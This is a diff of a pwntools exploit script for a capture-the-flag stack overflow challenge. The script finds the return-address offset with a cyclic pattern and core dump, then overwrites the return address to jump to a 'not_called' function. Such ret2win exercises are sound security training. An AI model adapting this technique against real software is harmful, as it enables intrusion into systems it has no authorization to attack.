@@ -1,26 +1,36 @@
 from pwn import *
+binary_path = './pwn/stack/rop-2/rop2'
 
-# Path to the binary
-binary_path = './pwn/stack/rop-1/rop1'
+# Start a process or connect to a remote service
+if args.REMOTE:
+    p = remote('challenge.example.com', 1337)
+else:
+    p = process(binary_path)
 
-# Start the process
-io = process(binary_path)
-
-# Load the binary
+# Load the binary and the ELF file
 elf = ELF(binary_path)
+rop = ROP(elf)
 
-# Find the offset to the return address
-offset = 136  # Adjust this value based on your testing
+# Step 1: Identify the offset to the return address
+pattern = cyclic(1024)
+p.sendline(pattern)
+p.wait()
 
-# Address of the 'not_called' function
+# Get the core dump to find the offset
+core = Coredump('./core')
+offset = cyclic_find(core.eip)
+print(f'Offset to return address: {offset}')
+
+# Step 2: Find the address of the 'not_called' function
 not_called_addr = elf.symbols['not_called']
+print(f'Address of not_called: {hex(not_called_addr)}')
 
-# Create the payload
+# Step 3: Construct the payload
 payload = b'A' * offset
 payload += p32(not_called_addr)
 
-# Send the payload
-io.sendline(payload)
+# Step 4: Send the payload
+p.sendline(payload)
 
-# Drop to an interactive shell
-io.interactive()
+# Interact with the process
+p.interactive()
